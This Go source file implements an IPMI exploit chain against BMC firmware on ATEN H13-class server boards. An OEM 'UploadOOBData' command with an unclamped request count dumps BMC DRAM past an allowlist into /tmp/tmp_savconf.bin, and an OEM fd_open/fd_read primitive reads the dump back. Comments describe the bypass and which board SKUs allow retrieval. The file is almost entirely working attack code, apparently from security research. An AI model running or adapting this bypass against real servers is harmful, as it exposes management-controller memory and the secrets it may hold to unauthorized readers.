package ipmi

import (
	"encoding/binary"
	"fmt"
)

// OOB (out-of-band data) file chain: an allow-list bypass for the BMC DRAM read.
//
// On the ATEN H13 stack the ordinary physical read (NetFn 0x30 / Cmd 0x70 /
// sub-function 0xC0) is page-allowlisted: SCU, DRAM and the flash window all
// answer CC 0xcc. But the BIOS out-of-band config path exposes a memory DUMP
// that has no allowlist. NetFn 0x30 / Cmd 0xA0 / sub-command 0x0C, UploadOOBData,
// runs `mem -f <file> -r 0x9ff00000 -c <count>` through a shell, copying `count`
// bytes of BMC DRAM starting at the fixed OOB shared window 0x9ff00000 (DRAM base
// 0x80000000 + 0x1ff00000) into a BMC file. The count is four attacker request
// bytes with no clamp, so the read reaches from 0x9ff00000 to the top of DRAM -
// exactly the region the 0xC0 allowlist refuses.
//
// The catch is retrieval. The dump lands in a BMC file (/tmp/tmp_savconf.bin);
// getting the bytes back over IPMI needs a file-read primitive. On the storage
// SKUs (H13SSF/E401MS, X13) the OEMHW1 fd_open/fd_read subcommands (0x30/0xAE)
// read arbitrary BMC files, so the chain is complete: dump -> fd_read. On the
// compute F401MS boards NetFn 0x30 Cmd 0xAE is TatlowChassisCmd, not an OEMHW1
// dispatcher, and the 0xA0 FileDownload namespace is SD/handle-based and never
// stages the /tmp dump - so the dump succeeds but the bytes are not retrievable
// over IPMI there. ReadOOBWindow performs the whole chain and reports precisely
// which half succeeded.

const (
	// oobUploadWindowBase is the fixed physical base the UploadOOBData handler
	// dumps from. It is hardcoded in the firmware sprintf, not caller-supplied.
	oobUploadWindowBase = 0x9ff00000
	// oobDumpFile is the BMC path UploadOOBData writes with file id 0.
	oobDumpFile = "/tmp/tmp_savconf.bin"
	// netFnSMCOOB / cmdSMCOOB are the BIOS OOB file-chain command.
	netFnSMCOOB      = 0x30
	cmdSMCOOB        = 0xA0
	oobSubUpload     = 0x0c // UploadOOBData: dump DRAM window -> file
	oobSubUploadDone = 0x0e // UploadOOBDataDone: finalize
)

// UploadOOBWindow triggers the DRAM-window dump. It copies `count` bytes from the
// fixed window 0x9ff00000 into the BMC dump file (file id 0). This is the
// allow-list bypass itself: it puts DRAM the 0xC0 read refuses into a BMC file.
// It does not retrieve the bytes - use ReadOOBWindow for the full chain.
func (s *CmdSess) UploadOOBWindow(count uint32) error {
	req := make([]byte, 6)
	req[0], req[1] = oobSubUpload, 0x00 // sub-command, file id 0
	binary.LittleEndian.PutUint32(req[2:6], count)
	cc, _, err := s.ExecRaw(netFnSMCOOB, cmdSMCOOB, req)
	if err != nil {
		return fmt.Errorf("UploadOOBData: %w", err)
	}
	if cc != 0x00 {
		return fmt.Errorf("UploadOOBData: completion code 0x%02x (0xc1=command absent, 0xd4=not Administrator)", cc)
	}
	// Finalize; best effort - the dump has already run.
	_, _, _ = s.ExecRaw(netFnSMCOOB, cmdSMCOOB, []byte{oobSubUploadDone, 0x00})
	return nil
}

// ReadOOBWindow performs the complete bypass: dump the DRAM window, then read the
// dump file back over IPMI. `offset` is measured from 0x9ff00000. Readback uses
// the OEMHW1 fd_open/fd_read file primitive, which exists only on storage-class
// firmware; on compute F401MS the dump still runs but ReadOOBWindow returns an
// error explaining that the bytes cannot be retrieved over IPMI on that build.
func (s *CmdSess) ReadOOBWindow(offset, length uint32) ([]byte, error) {
	if length == 0 {
		return nil, fmt.Errorf("length must be non-zero")
	}
	// Dump enough of the window to cover offset+length.
	if err := s.UploadOOBWindow(offset + length); err != nil {
		return nil, err
	}
	// Retrieve via the OEMHW1 file primitive (storage SKUs only).
	if err := s.HW1FileOpen(oobDumpFile, HW1FileCopy); err != nil {
		return nil, fmt.Errorf("OOB bypass: DRAM window 0x%08x+%d was dumped to %s on the BMC, but IPMI readback failed at fd_open: %w. "+
			"On compute F401MS (0xAE=TatlowChassisCmd) there is no OEMHW1 file primitive and the 0xA0 FileDownload namespace is SD-only, "+
			"so the dumped bytes are not retrievable over IPMI on this build - retrieve them on a storage SKU (H13SSF/E401MS) or via the OOB/BIOS shared-memory side",
			oobUploadWindowBase+offset, length, oobDumpFile, err)
	}
	out := make([]byte, 0, length)
	for got := uint32(0); got < length; {
		chunk := length - got
		if chunk > HW1MaxFileRead {
			chunk = HW1MaxFileRead
		}
		b, err := s.HW1FileRead(offset+got, int(chunk))
		if err != nil {
			return out, fmt.Errorf("OOB bypass fd_read at window+0x%x: %w", offset+got, err)
		}
		if len(b) == 0 {
			break
		}
		out = append(out, b...)
		got += uint32(len(b))
	}
	return out, nil
}
